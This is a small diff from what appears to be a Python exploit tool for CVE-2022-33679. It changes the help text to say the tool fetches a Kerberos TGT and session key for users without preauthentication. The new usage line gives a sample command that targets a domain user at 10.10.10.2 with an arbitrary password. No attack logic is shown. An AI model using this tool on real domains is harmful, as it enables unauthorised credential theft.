@@ -211,7 +211,7 @@ async def exploit(args):
 def main():
 	import argparse
 	
-	parser = argparse.ArgumentParser(description='Polls the kerberos service for a TGT for the sepcified user', formatter_class=argparse.RawDescriptionHelpFormatter, epilog = kerberos_url_help_epilog)
+	parser = argparse.ArgumentParser(description='Fetches TGT&session key for user who doesnt need kerberos preauth. CVE-2022-33679.', usage='Use it with a valid kerberus URL but any password. Example: "cve202233679 \'kerberos+pw://TEST\\asreptest:ANYPASSWORD@10.10.10.2\'"')
 	parser.add_argument('kerberos_connection_url', help='the kerberos target string. ')
 	parser.add_argument('-v', '--verbose', action='count', default=0)
 	
